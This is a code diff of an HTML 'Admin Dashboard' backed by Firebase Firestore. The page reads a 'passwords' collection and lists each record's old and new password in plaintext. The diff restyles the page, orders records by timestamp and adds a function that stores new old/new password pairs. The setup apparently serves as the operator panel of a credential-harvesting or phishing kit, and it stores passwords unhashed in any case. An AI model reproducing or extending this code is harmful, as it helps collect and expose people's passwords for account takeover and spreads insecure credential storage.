@@ -7,53 +7,59 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f0f2f5;
+      background-color: #f4f4f4;
       margin: 0;
       padding: 0;
     }
-    .header {
-      background-color: #007BFF;
-      color: white;
-      padding: 20px;
-      text-align: center;
-    }
     .container {
-      margin: 20px auto;
-      width: 90%;
       max-width: 1200px;
-      background: white;
+      margin: 20px auto;
       padding: 20px;
+      background: white;
       border-radius: 8px;
       box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
     }
     h1 {
+      text-align: center;
+      color: #333;
       margin-bottom: 20px;
     }
     table {
       width: 100%;
       border-collapse: collapse;
-      margin-top: 20px;
+      margin: 20px 0;
     }
-    th, td {
-      padding: 12px;
+    table th, table td {
       border: 1px solid #ddd;
-      text-align: left;
+      padding: 10px;
+      text-align: center;
     }
-    th {
+    table th {
       background-color: #007BFF;
       color: white;
     }
-    .action-btns button {
-      margin-right: 10px;
+    table tbody tr:nth-child(even) {
+      background-color: #f9f9f9;
+    }
+    table tbody tr:hover {
+      background-color: #f1f1f1;
+    }
+    @media (max-width: 768px) {
+      table th, table td {
+        font-size: 14px;
+        padding: 8px;
+      }
+    }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      color: #555;
     }
   </style>
 </head>
 <body>
-  <div class="header">
-    <h1>Admin Dashboard</h1>
-  </div>
   <div class="container">
-    <h2>User Details</h2>
+    <h1>Admin Dashboard</h1>
     <table>
       <thead>
         <tr>
@@ -62,16 +68,16 @@
           <th>New Password</th>
         </tr>
       </thead>
-      <tbody id="userTable">
-        <!-- Dynamic data will be inserted here -->
+      <tbody id="tableBody">
+        <!-- Data will be dynamically inserted here -->
       </tbody>
     </table>
+    <div class="footer">Powered by Firebase</div>
   </div>
 
   <script type="module">
-    // Import Firebase modules
     import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js';
-    import { getFirestore, collection, getDocs } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js';
+    import { getFirestore, collection, addDoc, getDocs, query, orderBy } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js';
 
     // Firebase configuration
     const firebaseConfig = {
@@ -88,30 +94,63 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    // Fetch and display user data
-    const userTable = document.getElementById('userTable');
+    // Reference to the table body
+    const tableBody = document.getElementById('tableBody');
 
-    async function loadUserData() {
+    // Fetch and display data
+    async function fetchPasswords() {
       try {
-        const querySnapshot = await getDocs(collection(db, 'passwords'));
+        // Query passwords collection ordered by timestamp
+        const passwordsRef = collection(db, 'passwords');
+        const orderedQuery = query(passwordsRef, orderBy('timestamp', 'asc'));
+        const querySnapshot = await getDocs(orderedQuery);
+
+        let index = 1; // Sequential ID counter
         querySnapshot.forEach((doc) => {
           const data = doc.data();
-          const row = `
-            <tr>
-              <td>${doc.id}</td>
-              <td>${data.oldPassword}</td>
-              <td>${data.newPassword}</td>
-            </tr>
-          `;
-          userTable.insertAdjacentHTML('beforeend', row);
+
+          // Create table row
+          const row = document.createElement('tr');
+
+          // Sequential ID
+          const idCell = document.createElement('td');
+          idCell.textContent = index++;
+          row.appendChild(idCell);
+
+          // Old Password
+          const oldPasswordCell = document.createElement('td');
+          oldPasswordCell.textContent = data.oldPassword;
+          row.appendChild(oldPasswordCell);
+
+          // New Password
+          const newPasswordCell = document.createElement('td');
+          newPasswordCell.textContent = data.newPassword;
+          row.appendChild(newPasswordCell);
+
+          // Append row to table
+          tableBody.appendChild(row);
         });
       } catch (error) {
-        console.error("Error loading user data:", error);
+        console.error("Error fetching passwords:", error);
       }
     }
 
-    // Load user data on page load
-    loadUserData();
+    // Add password to Firestore (with timestamp)
+    async function addPassword(oldPassword, newPassword) {
+      try {
+        await addDoc(collection(db, 'passwords'), {
+          oldPassword,
+          newPassword,
+          timestamp: new Date()
+        });
+        console.log("Password added successfully!");
+      } catch (error) {
+        console.error("Error adding password:", error);
+      }
+    }
+
+    // Fetch passwords on page load
+    fetchPasswords();
   </script>
 </body>
 </html>
